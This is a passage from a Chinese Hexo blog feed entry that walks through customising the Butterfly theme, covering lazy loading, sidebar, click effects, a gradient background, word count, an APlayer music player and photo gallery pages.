alt="image-20240409173949425">  </p><h2 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h2><p>配置了该属性后会替换无法展示的图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: /img/friend_404.gif</span><br><span class="line">  post_page: /img/404.jpg</span><br></pre></td></tr></table></figure><h1 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h1><p>新增hexo-lazyload-image模块</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>在主目录配置文件_config.yml增加配置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><p>这个就是图片没加载出来的时候，出现一个动图转转转的文章页样式 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740516.png" alt="image-20240409174005478">  </p><h1 id="图片放大查看"><a href="#图片放大查看" class="headerlink" title="图片放大查看"></a>图片放大查看</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">medium_zoom: <span class="literal">false</span></span><br><span class="line">fancybox: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="版权样式"><a href="#版权样式" class="headerlink" title="版权样式"></a>版权样式</h1><p>修改主题配置文件_config.butterfly.yml</p><p>复制的内容后面加上版权信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true # 是否开启网站复制权限</span><br><span class="line">  copyright:  # 复制的内容后面加上版权信息</span><br><span class="line">    enable: false  # 是否开启复制版权信息添加</span><br><span class="line">    limit_count: 50 # 字数限制，当复制文字大于这个字数限制时</span><br></pre></td></tr></table></figure><p>文章版权信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: true</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/4.0/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740536.png" alt="image-20240409174018503">  </p><h1 id="侧边栏样式"><a href="#侧边栏样式" class="headerlink" title="侧边栏样式"></a>侧边栏样式</h1><p>修改主题配置文件_config.butterfly.yml</p><p>调整侧边栏出现位置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aside:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  hide: <span class="literal">false</span></span><br><span class="line">  button: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span> # display on mobile</span><br><span class="line">  position: right # left or right </span><br></pre></td></tr></table></figure><p>个人信息</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">   fab fa-github: https:<span class="comment">//github.com/ || Github</span></span><br><span class="line">   fa fa-book-open: https:<span class="comment">//blog.csdn.net/mjh1667002013 || CSDN</span></span><br><span class="line">   fab fa-qq:  tencent:<span class="comment">//AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=728831102&amp;website=www.oicqzone.com || QQ</span></span><br><span class="line">   fas fa-envelope-open-text: mailto:<span class="number">1976083684</span><span class="meta">@qq</span>.com || Email</span><br></pre></td></tr></table></figure><h1 id="公告栏设置"><a href="#公告栏设置" class="headerlink" title="公告栏设置"></a>公告栏设置</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    content: This is my Blog #修改公告栏信息</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740662.png" alt="image-20240409174030633">  </p><h1 id="TOC目录"><a href="#TOC目录" class="headerlink" title="TOC目录"></a>TOC目录</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  post: <span class="literal">true</span></span><br><span class="line">  page: <span class="literal">false</span></span><br><span class="line">  number: <span class="literal">false</span></span><br><span class="line">  expand: <span class="literal">true</span> # 是否展开</span><br><span class="line">  style_simple: <span class="literal">false</span> # <span class="keyword">for</span> post</span><br><span class="line">  scroll_percent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740966.png" alt="image-20240409174038930">  </p><h1 id="背景美化"><a href="#背景美化" class="headerlink" title="背景美化"></a>背景美化</h1><p>修改主题配置文件 _config.butterfly.yml</p><h2 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h2><p>有冒光特效、烟火特效、爱心特效、文字特效，选择其中一个将enable设置为true就可以。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(打字效果)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(冒光特效)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(抖动特效)</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠标点击效果:萤火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  zIndex: <span class="number">9999</span> # -<span class="number">1</span> or <span class="number">9999</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart <span class="title function_">symbol</span> <span class="params">(鼠标点击效果: 爱心)</span></span><br><span class="line">click_heart:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠标点击效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  text:</span><br><span class="line">     - 富强</span><br><span class="line">     - 民主</span><br><span class="line">     - 文明</span><br><span class="line">     - 和谐</span><br><span class="line">     - 平等</span><br><span class="line">     - 公正</span><br><span class="line">     - 法治</span><br><span class="line">     - 爱国</span><br><span class="line">     - 敬业</span><br><span class="line">     - 诚信</span><br><span class="line">     - 友善</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  random: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740263.png" alt="image-20240409174048213">   </p><h2 id="打字效果"><a href="#打字效果" class="headerlink" title="打字效果"></a>打字效果</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(打字效果)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(冒光特效)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(抖动特效)</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="背景特效"><a href="#背景特效" class="headerlink" title="背景特效"></a>背景特效</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Background <span class="title function_">effects</span> <span class="params">(背景特效)</span></span><br><span class="line"># canvas_ribbon (静止彩带)</span><br><span class="line"># See: https:<span class="comment">//github.com/hustcc/ribbon.js</span></span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  size: <span class="number">150</span></span><br><span class="line">  alpha: <span class="number">0.6</span></span><br><span class="line">  zIndex: -<span class="number">1</span></span><br><span class="line">  click_to_change: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"># Fluttering <span class="title function_">Ribbon</span> <span class="params">(动态彩带)</span></span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line">#星空特效</span><br><span class="line"># canvas_nest</span><br><span class="line"># https:<span class="comment">//github.com/hustcc/canvas-nest.js</span></span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  color: <span class="string">&#x27;0,0,255&#x27;</span> #color of lines, <span class="keyword">default</span>: <span class="string">&#x27;0,0,0&#x27;</span>; RGB values: (R,G,B).(note: use <span class="string">&#x27;,&#x27;</span> to separate.)</span><br><span class="line">  opacity: <span class="number">0.7</span> # the opacity of <span class="title function_">line</span> <span class="params">(<span class="number">0</span>~<span class="number">1</span>)</span>, <span class="keyword">default</span>: <span class="number">0.5</span>.</span><br><span class="line">  zIndex: -<span class="number">1</span> # z-index property of the background, <span class="keyword">default</span>: -<span class="number">1.</span></span><br><span class="line">  count: <span class="number">99</span> # the number of lines, <span class="keyword">default</span>: <span class="number">99.</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="自定义背景主题色"><a href="#自定义背景主题色" class="headerlink" title="自定义背景主题色"></a>自定义背景主题色</h2><p>可以修改部分的UI颜色，没测试过</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># theme_color:</span><br><span class="line">#   enable: <span class="literal">true</span></span><br><span class="line">#   main: <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">#   paginator: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   button_hover: <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">#   text_selection: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   link_color: <span class="string">&quot;#99a9bf&quot;</span></span><br><span class="line">#   meta_color: <span class="string">&quot;#858585&quot;</span></span><br><span class="line">#   hr_color: <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">#   code_foreground: <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">#   code_background: <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">#   toc_color: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   blockquote_padding_color: <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">#   blockquote_background_color: <span class="string">&quot;#49b1f5&quot;</span></span><br></pre></td></tr></table></figure><h2 id="渐变背景"><a href="#渐变背景" class="headerlink" title="渐变背景"></a>渐变背景</h2><p>默认显示白色，可设置图片或者颜色<br>修改主题配置文件_config.butterfly.yml：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">background:</span><br></pre></td></tr></table></figure><p>设置渐变色步骤：</p><ol><li>在\Butterfly\source\css\目录下创建css文件 background.css：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#web_bg &#123;</span><br><span class="line">  background: -webkit-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -moz-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -o-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -ms-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: linear-gradient(</span><br><span class="line">    90deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改配置文件_config.butterfly.yml的引入方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject</span><br><span class="line"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">     - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/background.css&quot;</span>&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src=<span class="string">&quot;xxxx&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果背景色不生效，设置_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Website <span class="title function_">Background</span> <span class="params">(設置網站背景)</span></span><br><span class="line"># can set it to color or <span class="title function_">image</span> <span class="params">(可設置圖片 或者 顔色)</span></span><br><span class="line"># The formal of image: url(http:<span class="comment">//xxxxxx.com/xxx.jpg)</span></span><br><span class="line">background: <span class="string">&#x27;#efefef&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740434.png" alt="image-20240409174058336">  </p><h1 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h1><p>footer 的背景，当设置 false 时，将与主题色一致。修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># footer是否显示图片背景(与top_img一致)</span><br><span class="line">footer_bg: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091741053.png" alt="image-20240409174152727"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742215.png" alt="image-20240409174205076">  </p><h1 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h1><p>安装统计组件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save or yarn add hexo-wordcount</span><br></pre></td></tr></table></figure><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  post_wordcount: <span class="literal">true</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  total_wordcount: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742197.png" alt="image-20240409174215114">  </p><h1 id="添加音乐播放器"><a href="#添加音乐播放器" class="headerlink" title="添加音乐播放器"></a>添加音乐播放器</h1><h2 id="插件安装与配置"><a href="#插件安装与配置" class="headerlink" title="插件安装与配置"></a>插件安装与配置</h2><p>安装 <a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a> 这款插件。执行如下指令：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>插件配置方式为修改Hexo 的配置文件中进行如下修改。就是你的<a href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a>根目录下的_config.yml文件。</p><p>这块直接搜，没有在Hexo目录下的_config.yml文件中找到，将如下内容添加：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: <span class="literal">true</span></span><br><span class="line">  asset_inject: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>主题配置文件_config.butterfly.yml中开启aplayerInject：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject the css and <span class="title function_">script</span> <span class="params">(aplayer/meting)</span></span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>下面介绍两种常见的用法：</p><h2 id="普通页面播放器"><a href="#普通页面播放器" class="headerlink" title="普通页面播放器"></a>普通页面播放器</h2><p>在博客音乐播放页面（&#x2F;source&#x2F;music&#x2F;index.md）中添加如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% meting <span class="string">&quot;8872308188&quot;</span> <span class="string">&quot;netease&quot;</span> <span class="string">&quot;playlist&quot;</span> <span class="string">&quot;autoplay&quot;</span> <span class="string">&quot;mutex:false&quot;</span> <span class="string">&quot;listmaxheight:400px&quot;</span> <span class="string">&quot;preload:none&quot;</span> <span class="string">&quot;theme:#ad7a86&quot;</span>%&#125;</span><br></pre></td></tr></table></figure><p>常用的选项如下所示:</p><p><strong>server可选</strong>：netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），baidu（百度音乐）。建议网易云</p><p><strong>type可选</strong>：song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）。添加单曲选的歌曲，歌单选择playlist，可以自行尝试。</p><p><strong>id获取示例</strong>: 打开网易云音乐，选择喜欢的歌单，在网页版打开，获取歌单list，填入即可。使用的时候将上边的ID号换为自己喜欢的歌单即可。注意歌单中不能包括VIP音乐，否则无法解析。建议单独建立一个歌单，以后有喜欢的音乐添加进去，网页也会自动同步添加。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742965.png" alt="image-20240409174227907">  </p><p>lrcType设置为 -1默认显示歌词，放在fixed模式下比较合适。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743652.png" alt="image-20240409174302343">  </p><h2 id="全局吸底Aplayer模式"><a href="#全局吸底Aplayer模式" class="headerlink" title="全局吸底Aplayer模式"></a>全局吸底Aplayer模式</h2><p>把 aplayer代码 插入到主题配置文件_config.butterfly.yml的 inject.bottom 即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;div class=<span class="string">&quot;aplayer no-destroy&quot;</span> data-id=<span class="string">&quot;7422861869&quot;</span> data-server=<span class="string">&quot;netease&quot;</span> data-type=<span class="string">&quot;playlist&quot;</span> data-fixed=<span class="string">&quot;true&quot;</span> data-autoplay=<span class="string">&quot;true&quot;</span> data-lrcType=<span class="string">&quot;-1&quot;</span>&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>需要修改的参数就只有data-id、data-server、data-type、data-autoplay&#x3D;”true”、data-lrcType&#x3D;”-1”一些常用的参数，可以自行根据需要修改。</p><p>最后，如果你想切换页面时，音乐不会中断。请把主题配置文件的 pjax 设为 true即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pjax:</span><br><span class="line"> enable: ture</span><br><span class="line"> exclude:</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743658.png" alt="image-20240409174316617"> </p><h1 id="创建主题图库"><a href="#创建主题图库" class="headerlink" title="创建主题图库"></a>创建主题图库</h1><p>执行如下命令，创建photos页面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo n page photos     #创建你的页面   </span><br></pre></td></tr></table></figure><p>在index.md文件的 Front-matter 中添加如下内容（不现实侧边栏和评论区）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743503.png" alt="image-20240409174322454"> </p><p>添加图库集合页</p><p>图库集合页面就是普通的页面，比如上面创建的&#x2F;photos&#x2F;index.md页面，下面将其设置成一个图库集合页面！设置图库集合页面是使用外挂标签来实现的，书写格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这里面每个galleryGroup中设置的内容如下：</p><ul><li>name：图库名字</li><li>description：图库描述</li><li>link：链接到对应相册地址</li><li>img-url：图库封面地址</li></ul><p>如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;壁紙&#x27;</span> <span class="string">&#x27;收藏的一些壁纸，侵删&#x27;</span> <span class="string">&#x27;/album/wallpaper&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/wallpaper.jpeg %&#125;</span></span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;风景&#x27;</span> <span class="string">&#x27;相册是我快乐过的证据&#x27;</span> <span class="string">&#x27;/album/life&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/life.jpeg %&#125;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这样设置后，页面就变成了这样</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743457.png" alt="image-20240409174346000">  </p><p>图库子页面</p><p>此时，点击任何一个图集，都会重定向到 404 页！这是因为我们还没有创建相应的子页面！这里我以《生活》这个相册为例来创建它的子页面！</p><p>第一步：打开终端，切换到本地 Hexo 博客的根目录下，执行如下命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="title class_">page</span> life</span><br></pre></td></tr></table></figure><p>然后会在博客根目录下的&#x2F;source目录下生成名为life的文件夹，并在其中生成一个名为index.md的文件，这个文件就对应着《生活》这个子页面！</p><p>但是此时图库子页面&#x2F;source&#x2F;life&#x2F;index.md跟相册首页&#x2F;source&#x2F;photos&#x2F;index.md是平级的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744958.png" alt="image-20240409174400897">  </p><p>第二步：将life整个文件夹都移动到album文件夹中：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744854.png" alt="image-20240409174408799">  </p><p>第三步：此时打开&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.md文件，修改如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744316.png" alt="image-20240409174417267">  </p><p>第四步：然后在子页面（也就是&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.md）中使用标签外挂挂上自己的照片，写法如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![]()</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p>比如我下面这样，填写很多个自己的图片（图片路径需要自己填充）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/72/wallhaven-72yzje.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/l8/wallhaven-l8v3ey.png)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/1p/wallhaven-1poo61.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/kx/wallhaven-kxj3l1.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/jx/wallhaven-jxl31y.png)</span></span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744405.png" alt="image-20240409174443067">   </p><h1 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h1><p>具体实现可参考：<a href="https://fe32.top/articles/hexo1611/">https://fe32.top/articles/hexo1611/</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> 主题 </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到-1搭建个人博客</title>
      <link href="/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
